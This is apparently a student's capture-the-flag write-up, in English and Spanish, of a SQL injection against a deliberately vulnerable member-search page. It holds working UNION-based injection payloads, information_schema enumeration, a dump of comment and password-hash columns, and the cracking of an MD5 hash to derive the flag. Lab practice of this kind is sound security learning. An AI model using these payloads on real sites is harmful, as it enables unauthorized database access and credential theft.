@@ -1,0 +1,365 @@
+BREACH 2 SQL INJECTION
+
+At http://10.13.200.178/?page=member
+i can search a member with his Id on a search bar with submit button.
+
+submit button calls GET to http://10.13.200.178/?page=member and with query id == input.
+At html code We can see a hidden input with name="page" value="member".
+And another one with name='id' and value='inputtextforIdsearch'
+At submit url is: http://10.13.200.178/?page=member&id=inputtext&Submit=Submit#
+output: 
+    Unknown column 'inputtext' in 'where clause'
+
+with id='as'
+output:
+    You have an error in your SQL syntax;
+    check the manual that corresponds to your MariaDB server version
+    for the right syntax to use near 'inputext' at line 1
+
+So its using MariaDB and not sanitizing output since they are raw MariaDb exceptions.
+So if i can put SQL syntax in id searchParam i can make an SQL injection.
+
+id='SHOW TABLES;'
+http://10.13.200.178/?page=member&id=%27SHOW%20TABLES%27&Submit=Submit#
+output:
+    You have an error in your SQL syntax; 
+    check the manual that corresponds to your MariaDB server version 
+    for the right syntax to use near 'SHOW TABLES' at line 1
+
+I think MariaDB is translating query 'id' value into a SQL statement.
+Exactly after the WHERE clause. So it must be doing some SELECT * FROM TABLES WHERE 'id-value-input'.
+So if i find a condition that prints something i could be on the right track.
+let's try with id=id>=0.
+SELECT * FROM TABLES WHERE id >= 0.
+tested: id >= 0
+Imaginando que la tabla tenga un id entero creciente para cada fila de la tabla.
+output: 
+    Unknown column 'id' in 'where clause' -> fuk
+
+The SQL Statement is more like this then:
+SELECT * FROM TABLES WHERE ID = 'id-value-input'.
+So id=1 must output something
+GET http://10.13.200.178/?page=member&id=1&Submit=Submit#
+output:
+    ID: 1 
+    First name: one
+    Surname : me
+
+GET http://10.13.200.178/?page=member&id=5&Submit=Submit#
+output:
+    ID: 5 
+    First name: Flag
+    Surname : GetThe
+
+Read: 
+    https://owasp.org/www-community/attacks/SQL_Injection
+
+Realized about AND & OR operator.
+For doing something like 
+
+SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR 'a'='a';
+
+http://10.13.200.178/index.php?page=member&id="'1' AND 'a'='a'"&Submit=Submit#
+output:
+    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\"\'1\' AND \'a\'=\'a\'\"' at line 1
+
+let's test with some Blind SQL Injection.
+Is a type of SQL Injection attack that asks the database true or false questions with null values and discover blindly
+and determines the answer based on the applications response.
+let's test with more obvious tests.
+Read:
+    https://owasp.org/www-community/attacks/Blind_SQL_Injection
+
+http://10.13.200.178/?page=member&id=1 AND 5=5&Submit=Submit#       (Without quoting, the page is escaping some chars)
+Output:
+    ID: 1 AND 5=5 
+    First name: one
+    Surname : me
+the AND operator has been executed.
+
+A partir de ahora segun 
+https://owasp.org/www-community/attacks/Blind_SQL_Injection 
+dependemos de las limitaciones de permisos del servidor.
+
+Ahora a ser creativos en la inyección SQL.
+
+EXPLOIT=?????
+URL:            http://10.13.200.178/?page=member&id=EXPLOIT&Submit=Submit#
+SQL COMMAND:    SELECT * FROM TABLES WHERE id=EXPLOIT.
+* --> puede que estemos buscando campos especificos id, name, username.
+TABLES --> puede que no estemos buscando en todas las tablas.
+Hay que encontrar más info sobre qué tablas en MariaDB y las columnas de la tabla member (si existe).
+
+TESTED: id=1 OR name=will
+output: Unknown column 'name' in 'where clause'
+
+I think we may discover the column and check their values.
+I wanted to pursue my WHERE clause so after the OR operator resulting in false i could find a command to gather info
+I found about UNION SELECT for combining two select queries.
+So..
+TESTED: 1 OR 1=0 UNION SELECT * FROM table
+output:
+    Table 'Member_Sql_Injection.table' doesn't exist
+
+TESTED:  1 OR 1=0 UNION SELECT * FROM users
+output:
+    The used SELECT statements have a different number of columns
+
+TESTED: 1 OR 1=0 UNION SELECT flag FROM users 
+output:
+    Unknown column 'flag' in 'field list'
+
+
+TESTED: 1 OR 1=0 UNION SELECT * FROM users.members
+output:
+    SELECT command denied to user 'borntosec'@'localhost' for table 'members'
+
+Ou finally, the second query must be of two params, default to NULL
+TESTEd: 1 OR 1=1 UNION SELECT NULL,NULL FROM users 
+output: 
+    ID: 1 OR 1=1 UNION SELECT NULL,NULL FROM users 
+    First name: one
+    Surname : me
+    ID: 1 OR 1=1 UNION SELECT NULL,NULL FROM users 
+    First name: two
+    Surname : me
+    ID: 1 OR 1=1 UNION SELECT NULL,NULL FROM users 
+    First name: three
+    Surname : me
+    ID: 1 OR 1=1 UNION SELECT NULL,NULL FROM users // id=5
+    First name: Flag
+    Surname : GetThe
+    ID: 1 OR 1=1 UNION SELECT NULL,NULL FROM users // id=5
+    First name: 
+    Surname : 
+No clue why last value with no input and valid has id=5 from users i think
+
+# Enumerated table following MariaDb schema.
+https://mariadb.com/docs/server/reference/system-tables/information-schema/information-schema-tables
+
+TESTED: 1 OR 1=1 UNION SELECT NULL,NULL FROM information_schema.tables WHERE table_schema=database()
+output:
+    ·same
+
+# 1. Enumerate Column Structure
+Since we know the users table exists
+
+TESTED: 1 OR 1=0 UNION SELECT NULL,NULL FROM information_schema.columns WHERE table_name=users AND table_schema=database()
+output: 
+    Unknown column 'users' in 'where clause'
+Bruhhhh
+
+TESTED: 1 ORDER by 2
+output:
+    ID: 1 ORDER BY 2 
+    First name: one
+    Surname : me
+With order by 3 the table doesnt recognize column 3.
+
+I finally found this working statements with UNION keyword for comibining queries
+MariaDb
+-- list all databases
+SELECT schema_name
+FROM information_schema.schemata;
+First query 1 AND 1=0 statement is returning 2 values, we must fill with null to match result of 2nd query
+So tested: 1 AND 1=0 UNION SELECT schema_name,null FROM information_schema.schemata
+output:
+    ID: 1 AND 1=0 UNION SELECT schema_name,null FROM information_schema.schemata; 
+    First name: information_schema
+    Surname : 
+    ID: 1 AND 1=0 UNION SELECT schema_name,null FROM information_schema.schemata; 
+    First name: Member_Brute_Force
+    Surname : 
+    ID: 1 AND 1=0 UNION SELECT schema_name,null FROM information_schema.schemata; 
+    First name: Member_Sql_Injection
+    Surname : 
+    ID: 1 AND 1=0 UNION SELECT schema_name,null FROM information_schema.schemata; 
+    First name: Member_guestbook
+    Surname : 
+    ID: 1 AND 1=0 UNION SELECT schema_name,null FROM information_schema.schemata; 
+    First name: Member_images
+    Surname : 
+    ID: 1 AND 1=0 UNION SELECT schema_name,null FROM information_schema.schemata; 
+    First name: Member_survey
+    Surname : 
+
+-- list tables inside a database
+SELECT table_name
+FROM information_schema.tables
+
+Tested; 1 AND 1=0 UNION SELECT table_name,null FROM information_schema.tables;
+output:
+    see tables.txt
+
+-- list columns for one table
+SELECT column_name, data_type
+FROM information_schema.columns
+WHERE table_schema = 'database' AND table_name = 'dbname';
+
+Tested: 1 AND 1=0 UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_schema = 'Member_Sql_Injection' AND table_name = 'users';
+output: no column in where clause
+
+Finally tested: 1 AND 1=0 UNION  SELECT column_name, data_type FROM information_schema.columns 
+output: many_types and column names of the db!!
+    I made CTRL^F and search Flag Bingo !
+
+    ID: 1 AND 1=0 UNION  SELECT column_name, data_type FROM information_schema.columns 
+    First name: FLAG
+    Surname : int
+
+So ran the same command but with colum name table_name to knwo wher flag column is
+tested: 1 AND 1=0 UNION  SELECT column_name, table_name FROM information_schema.columns 
+output:
+    [...]
+    First name: FLAG
+    Surname : INNODB_SYS_TABLES
+    [...]
+
+mmmm...
+Table 'Member_Sql_Injection.INNODB_SYS_TABLES' doesn't exist
+You thought it as well haha
+Tested: 1 AND 1=0 UNION SELECT null,null FROM INNODB_SYS_TABLES WHERE column_name=FLAG
+
+From the table and column output i also got;
+First name: id
+Surname : db_default
+
+First name: username
+Surname : db_default
+
+First name: password
+Surname : db_default
+
+First name: user_id
+Surname : users
+
+First name: first_name
+Surname : users
+
+First name: last_name
+Surname : users
+
+First name: town
+Surname : users
+
+First name: country
+Surname : users
+
+First name: planet
+Surname : users
+
+MMMM....
+Table 'Member_Sql_Injection.db_default' doesn't exist
+
+Finally for The FInals read docs and tested;
+Query to retrieve Database and table name from schema of tables
+
+ID: 1 AND 1=0 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES 
+First name: Member_Brute_Force
+Surname : db_default <---noice
+ID: 1 AND 1=0 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES 
+First name: Member_Sql_Injection
+Surname : users <--- Gotcha
+ID: 1 AND 1=0 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES 
+First name: Member_guestbook
+Surname : guestbook <--- Juicy
+ID: 1 AND 1=0 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES 
+First name: Member_images
+Surname : list_images <---- AmAsing
+ID: 1 AND 1=0 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES 
+First name: Member_survey
+Surname : vote_dbs <-- legend
+
+tested: 1 AND 1=0 UNION SELECT USER,HOST FROM mysql.global_priv
+output: SELECT command denied to user 'borntosec'@'localhost' for table 'global_priv'
+
+tested: 1 AND 1=0 UNION SELECT TABLE_ROWS,CREATE_OPTIONS FROM information_schema.TABLES WHERE table_name=USERS
+output:Unknown column 'USERS' in 'where clause'
+
+
+tested: 1 AND 1=0 UNION SELECT ORDINAL_POSITION,COLUMN_NAME FROM information_schema.columns 
+output:
+    First name: 1
+    Surname : user_id
+    ID: 1 AND 1=0 UNION SELECT ORDINAL_POSITION,COLUMN_NAME FROM information_schema.columns 
+    First name: 2
+    Surname : first_name
+    ID: 1 AND 1=0 UNION SELECT ORDINAL_POSITION,COLUMN_NAME FROM information_schema.columns 
+    First name: 3
+    Surname : last_name
+    ID: 1 AND 1=0 UNION SELECT ORDINAL_POSITION,COLUMN_NAME FROM information_schema.columns 
+    First name: 4
+    Surname : town
+    ID: 1 AND 1=0 UNION SELECT ORDINAL_POSITION,COLUMN_NAME FROM information_schema.columns 
+    First name: 5
+    Surname : country
+    ID: 1 AND 1=0 UNION SELECT ORDINAL_POSITION,COLUMN_NAME FROM information_schema.columns 
+    First name: 6
+    Surname : planet
+
+tested: 1 AND 1=0 UNION SELECT town,country FROM users 
+output: 
+    First name: Paris 
+    Surname : France
+    ID: 1 AND 1=0 UNION SELECT town,country FROM users 
+    First name: Helsinki
+    Surname : Finlande
+    ID: 1 AND 1=0 UNION SELECT town,country FROM users 
+    First name: Dublin
+    Surname : Irlande
+    ID: 1 AND 1=0 UNION SELECT town,country FROM users 
+    First name: 42
+    Surname : 42
+
+Instead of writing ORDINAL_POSITION for getting a WHERE clause to work
+let's check all column from users table.
+tested: 1 AND 1=0 UNION SELECT table_name,COLUMN_NAME FROM information_schema.columns 
+output:
+    First name: users
+    Surname : user_id
+    ID: 1 AND 1=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns  
+    First name: users
+    Surname : first_name
+    ID: 1 AND 1=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns  
+    First name: users
+    Surname : last_name
+    ID: 1 AND 1=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns  
+    First name: users
+    Surname : town
+    ID: 1 AND 1=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns  
+    First name: users
+    Surname : country
+    ID: 1 AND 1=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns  
+    First name: users
+    Surname : planet
+    ID: 1 AND 1=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns  
+    First name: users
+    Surname : Commentaire
+    ID: 1 AND 1=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns  
+    First name: users
+    Surname : countersign
+
+There was more fields ! 
+
+So lets see them;
+tested: 1 AND 1=0 UNION SELECT Commentaire,countersign FROM users 
+output:
+    ID: 1 AND 1=0 UNION SELECT Commentaire,countersign FROM users 
+    First name: Je pense, donc je suis
+    Surname : 2b3366bcfd44f540e630d4dc2b9b06d9
+    ID: 1 AND 1=0 UNION SELECT Commentaire,countersign FROM users 
+    First name: Aamu on iltaa viisaampi.
+    Surname : 60e9032c586fb422e2c16dee6286cf10
+    ID: 1 AND 1=0 UNION SELECT Commentaire,countersign FROM users 
+    First name: Dublin is a city of stories and secrets.
+    Surname : e083b24a01c483437bcf4a9eea7c1b4d
+    ID: 1 AND 1=0 UNION SELECT Commentaire,countersign FROM users 
+    First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+    Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+5ff9d0165b4f92b14994e5c685cdce28 --> CrakStation --> md5 hash -> FortyTwo -> printf fortytwo > flag -> sha256sum flag ->
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  flag
+
+tried to login with Flag and password hash but wrong answer
+
+i dont know if the flag is the hash i want ot think yes since there is no more column on my database where i'm working with MEMber page query
